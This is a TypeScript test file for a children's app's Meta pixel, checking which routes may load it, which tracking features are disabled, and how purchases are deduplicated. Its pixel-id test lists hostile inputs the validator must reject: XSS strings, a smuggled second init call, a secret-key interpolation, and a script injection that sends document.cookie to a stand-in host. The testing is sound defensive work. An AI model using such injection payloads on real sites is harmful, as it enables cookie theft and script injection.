/**
 * The Meta pixel, and the two promises it has to keep.
 *
 * The first is that a child's screen contacts nobody. That is the sentence
 * the privacy page is built on, and a marketing tag mounted in the root
 * layout is exactly how it would stop being true — silently, one new route
 * at a time. So the list of pages the pixel is allowed on is checked here
 * against the pages that actually exist on disk: add a route and this test
 * decides whether it may carry a pixel, not the person adding it.
 *
 * The second is that the id compiled into an inline `<script>` is a number.
 * KIDDO's CSP allows inline script (see next.config.ts), so an id read from
 * the environment and interpolated unchecked would be an injection point
 * with whoever can set a build variable as its author.
 *
 * The conversion events add a third: a purchase is reported once. `/welcome`
 * is a page a parent can reload, and a subscription that is still there on
 * the second reading is not a second sale. That one is checked by driving
 * the reporter itself against a pretend browser, below.
 */
import assert from "node:assert/strict";
import { readdirSync, readFileSync } from "node:fs";
import { test } from "node:test";

import { AMOUNTS, NO_SUBSCRIPTION, type SubscriptionState } from "@/lib/billing/subscription";

/* The id is read from the environment once, when the module is first
   imported, exactly as a build reads it. So it is set here first — a
   made-up number, because what is checked is what *would* be sent — and the
   two analytics modules are imported after it. Written as static imports
   they would have been hoisted above this line, and every test below would
   have quietly measured a build that has no pixel at all. */
const PIXEL = "1234567890123456";
process.env.NEXT_PUBLIC_META_PIXEL_ID = PIXEL;
const { isParentPage, pixelId } = await import("@/lib/analytics/meta");
const { PURCHASE_KEY, reportCheckoutStarted, reportPurchase } = await import("@/lib/analytics/events");

/* ---- the id ------------------------------------------------------------ */

test("only a plain number is ever compiled into the pixel's script", () => {
  assert.equal(pixelId("2532624113883147"), "2532624113883147");
  assert.equal(pixelId("  2532624113883147  "), "2532624113883147", "trimmed");

  for (const hostile of [
    undefined,
    "",
    "   ",
    "1234",                                   /* too short to be a dataset id */
    "2532624113883147x",
    "'); fetch('https://evil.test?c='+document.cookie); ('",
    "');alert(1);//",
    "2532624113883147'); fbq('init','999",
    "<script>alert(1)</script>",
    "${process.env.STRIPE_SECRET_KEY}",
  ]) {
    assert.equal(pixelId(hostile), null, `${hostile} must not become a pixel`);
  }
});

/* ---- which pages carry it ---------------------------------------------- */

/** The pages a parent reads. Everything else on this site is a child's. */
const PARENT_PAGES = new Set(["/", "/join", "/welcome", "/privacy", "/parents", "/parents/reset"]);

/** Every route in the app, read from the files rather than from a list. */
function routes(dir: string, path = ""): string[] {
  const here = readdirSync(dir, { withFileTypes: true });
  const found = here.some((entry) => /^page(\.dev)?\.tsx$/.test(entry.name)) ? [path || "/"] : [];
  return here
    .filter((entry) => entry.isDirectory())
    .flatMap((entry) => routes(`${dir}/${entry.name}`, `${path}/${entry.name}`))
    .concat(found);
}

test("the pixel is allowed on the parent's pages and on no others", () => {
  const app = new URL("../src/app", import.meta.url).pathname;
  const all = routes(app)
    /* Route groups and API handlers are not pages anyone lands on. */
    .filter((route) => !route.startsWith("/api"))
    /* `[gameId]` stands for a real game; the pixel sees the filled-in path. */
    .map((route) => route.replace(/\[[^\]]+\]/g, "sample"));

  assert.ok(all.length > 8, "the app should have more routes than this");

  for (const route of all) {
    assert.equal(
      isParentPage(route),
      PARENT_PAGES.has(route),
      PARENT_PAGES.has(route)
        ? `${route} is a parent's page and should be measured`
        : `${route} would carry a marketing tag on a child's screen`,
    );
  }

  /* The child's own screens, named outright, so that a refactor that empties
     the walk above still fails rather than passing on nothing. */
  for (const child of ["/play", "/play/sample", "/worlds/counting", "/worlds/counting/one", "/character"]) {
    assert.equal(isParentPage(child), false, child);
  }
  for (const parent of PARENT_PAGES) {
    assert.equal(isParentPage(parent), true, parent);
    assert.equal(isParentPage(`${parent}/`), true, `${parent} with a trailing slash`);
  }
  assert.equal(isParentPage(null), false, "no path yet is not a parent page");
  /* Not a prefix match: a child's route may not borrow a parent's name. */
  assert.equal(isParentPage("/parentsomething"), false);
  assert.equal(isParentPage("/play/parents"), false);
});

/* ---- what the tag itself does ------------------------------------------ */

test("the tag reports page views, and nothing the parent typed", () => {
  const written = readFileSync(
    new URL("../src/components/analytics/MetaPixel.tsx", import.meta.url),
    "utf8",
  );
  /* The code, without the prose around it. The doc comment explains what the
     tag deliberately does *not* do, and a test that greps a file for the
     words it is happy not to see would punish writing that down. */
  const source = written.replace(/\/\*[\s\S]*?\*\//g, "");

  /* Automatic configuration reads button text and form field values off the
     page it sits on. `/join` and `/parents` are pages where a parent types
     an email address and a password. It is turned off before init, or the
     privacy page is telling parents something that is not so. */
  const autoConfig = source.indexOf("'autoConfig', false");
  const init = source.indexOf("fbq('init'");
  assert.ok(autoConfig > -1, "autoConfig must be turned off");
  assert.ok(init > -1 && autoConfig < init, "and turned off before init");

  /* And the pixel's own SPA tracking, which is the one that reaches a
     child's screen: fbevents.js hooks history.pushState, so a parent who
     opened the landing page would otherwise have every route their child
     walked into reported for them. Every page view KIDDO sends is sent by
     the effect, deliberately, or it is not sent. */
  const pushState = source.indexOf("disablePushState = true");
  assert.ok(pushState > -1, "the pixel must not report page views on its own");
  assert.ok(pushState < init, "and must be told so before init");

  /* Nothing is loaded from Facebook except the pixel's own script. */
  const hosts = [...source.matchAll(/https:\/\/([a-z0-9.-]+)/g)].map((m) => m[1]);
  assert.deepEqual([...new Set(hosts)], ["connect.facebook.net"]);

  /* Meta's snippet ships a <noscript> beacon; React would fire it on every
     client navigation for readers who do have JavaScript. */
  assert.doesNotMatch(source, /noscript/i);

  /* The guard is a real early return, not a CSS class or an opacity. */
  assert.match(source, /if \(!measured\) return null;/);

  /* And the page view is sent to this pixel by name. `track` on its own is
     swallowed as a duplicate the second time it is called in a document,
     which is every page a parent opens after the first one. */
  assert.match(source, /fbq\?\.\("trackSingle", META_PIXEL_ID, "PageView"\)/);
});

/* ---- the conversions --------------------------------------------------- */

/**
 * A browser, as much of one as `events.ts` touches: a path, a storage that
 * can be told to fail the way Safari's does, and an `fbq` that writes down
 * what it was asked to send. Assigned to the global because that is where
 * the module looks — it is written for a browser, and this is the smallest
 * honest one.
 */
function pretendBrowser(path = "/welcome", storage: "works" | "blocked" = "works") {
  const sent: unknown[][] = [];
  const kept = new Map<string, string>();
  const refuse = () => {
    throw new Error("storage is off");
  };
  const window = {
    location: { pathname: path },
    fbq: (...args: unknown[]) => void sent.push(args),
    localStorage: {
      getItem: storage === "works" ? (key: string) => kept.get(key) ?? null : refuse,
      setItem: storage === "works" ? (key: string, value: string) => void kept.set(key, value) : refuse,
    },
  };
  (globalThis as { window?: unknown }).window = window;
  return { sent, kept, window };
}

/** A subscription as the webhook writes one. */
const PAID: SubscriptionState = {
  ...NO_SUBSCRIPTION,
  status: "active",
  plan: "monthly",
  stripeSubscriptionId: "sub_1234",
};

test("a purchase is reported once per subscription, price and plan only", () => {
  const { sent, kept } = pretendBrowser("/welcome");
  reportPurchase(PAID);
  reportPurchase(PAID);
  reportPurchase({ ...PAID, plan: "yearly" });

  assert.equal(sent.length, 1, "one Purchase, however many times the page renders");
  const [verb, pixel, event, details, options] = sent[0] as [string, string, string, Record<string, unknown>, Record<string, unknown>];
  assert.equal(verb, "trackSingle", "named, or a second pixel on the page would count it too");
  assert.equal(pixel, PIXEL);
  assert.equal(event, "Purchase");
  assert.deepEqual(details, { value: AMOUNTS.monthly / 100, currency: "MYR", content_name: "monthly" });
  /* Derived from the subscription, so a second device — or this one with its
     storage cleared — is deduplicated by Meta rather than counted twice. */
  assert.deepEqual(options, { eventID: "purchase_sub_1234" });
  assert.equal(kept.get(PURCHASE_KEY), "sub_1234");

  /* Nothing in the beacon is about the person who paid. */
  assert.doesNotMatch(JSON.stringify(sent), /sub_1234(?!")|email|uid|@/);
});

test("a purchase with nothing to name it is not reported", () => {
  const { sent } = pretendBrowser("/welcome");
  reportPurchase(NO_SUBSCRIPTION);
  reportPurchase({ ...PAID, stripeSubscriptionId: null });
  reportPurchase({ ...PAID, plan: null });
  assert.deepEqual(sent, [], "an unnamed subscription cannot be deduplicated, so it is not sent");
});

test("a device that cannot remember still reports only what Meta can dedupe", () => {
  const { sent } = pretendBrowser("/welcome", "blocked");
  reportPurchase(PAID);
  reportPurchase(PAID);
  /* Storage threw on both the read and the write, so the local guard is
     gone; the `eventID` is what is left, and it is the same both times. */
  assert.equal(sent.length, 2);
  assert.deepEqual(sent[0][4], sent[1][4]);
});

test("no conversion leaves a page the pixel is not allowed on", () => {
  for (const path of ["/play", "/worlds/counting", "/play/sample"]) {
    const { sent, kept } = pretendBrowser(path);
    reportCheckoutStarted("monthly");
    reportPurchase(PAID);
    assert.deepEqual(sent, [], `${path} must report nothing`);
    assert.equal(kept.size, 0, `${path} must not even remember`);
  }
});

test("a checkout is reported with the plan the parent chose", () => {
  const { sent } = pretendBrowser("/join");
  reportCheckoutStarted("yearly");
  assert.deepEqual(sent[0], [
    "trackSingle",
    PIXEL,
    "InitiateCheckout",
    { value: AMOUNTS.yearly / 100, currency: "MYR", content_name: "yearly" },
  ]);
});

test("the checkout event is sent before the browser leaves for Stripe", () => {
  /* A beacon is cancelled by the navigation that follows it, so the order of
     these two lines in `startCheckout` is the whole event. */
  const source = readFileSync(new URL("../src/lib/cloud/session.ts", import.meta.url), "utf8");
  const reported = source.indexOf("reportCheckoutStarted(plan)");
  const left = source.indexOf("window.location.assign(url)");
  assert.ok(reported > -1 && left > -1);
  assert.ok(reported < left, "report the checkout before redirecting to Stripe");
});

test("the purchase is reported from the subscription, not from Stripe's redirect", () => {
  const source = readFileSync(new URL("../src/components/account/WelcomeGate.tsx", import.meta.url), "utf8");
  /* `open` is `hasAccess` on what the webhook wrote. `checkout === "success"`
     is Stripe saying where the parent came from, which is not a payment. */
  assert.match(source, /if \(open && subscription\) reportPurchase\(subscription\)/);
  assert.doesNotMatch(source.replace(/\/\*[\s\S]*?\*\//g, ""), /checkout === "success"[\s\S]{0,80}reportPurchase/);
});
